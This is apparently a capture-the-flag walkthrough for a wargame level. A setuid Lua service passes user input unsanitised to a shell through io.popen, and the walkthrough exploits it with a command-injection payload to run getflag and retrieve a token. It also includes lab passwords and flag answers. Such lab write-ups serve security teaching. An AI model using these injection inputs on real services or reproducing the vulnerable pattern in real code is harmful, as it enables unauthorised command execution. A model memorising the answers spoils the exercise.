# Level 11

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level11@192.168.1.32
	Password: feulo4b72j7edeahuete3no7c
	```

1. Check files.

	```sh
	> ls -l
	total 4
	-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

	> ./level11.lua
	lua: ./level11.lua:3: address already in use
	stack traceback:
		[C]: in function 'assert'
		./level11.lua:3: in main chunk
		[C]: ?
	```

1. The script is already running. We need to analyze it.

	```lua
	#!/usr/bin/env lua

	-- Create a socket, and bind it to 127.0.0.1:5151
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	-- Hash function, taking a password as argument, calls a Shell command to hash it and returns the hash.
	function hash(pass)
		-- Is the password just concatenated into the command ?
		-- We have to try something here
		prog = io.popen("echo "..pass.." | sha1sum", "r")
		data = prog:read("*all")
		prog:close()

		data = string.sub(data, 1, 40)

		return data
	end

	while 1 do
		local client = server:accept()
		-- Ask for password
		client:send("Password: ")
		client:settimeout(60)
		local l, err = client:receive()

		if not err then
			print("trying " .. l)
			local h = hash(l)

			-- Check if password hash match
			-- But even if we get the password right, it only shows a message
			-- so nothing to exploit here, no need to reverse the hash
			if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
				client:send("Erf nope..\n");
			else
				client:send("Gz you dumb*\n")
			end
		end

		client:close()
	end
	```

1. Now we have a better understanding of what's happening, let's do some test.

	```sh
	> nc 127.0.0.1 5151
	Password: qwe
	Erf nope..

	# Try to insert something to exploit the concatenation
	> nc 127.0.0.1 5151
	Password: ; touch /tmp/exploit11; echo
	Erf nope..

	> ls -l /tmp/exploit11
	-rw-r--r-- 1 flag11 flag11 0 Aug 28 18:01 /tmp/exploit11
	```

1. Amazing, the command injection works. Get the flag.

	```sh
	> nc 127.0.0.1 5151
	Password: ; getflag > /tmp/exploit11; echo
	Erf nope..

	> cat /tmp/exploit11
	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
	```

## Documentation

- Language: [Lua](https://www.lua.org/)
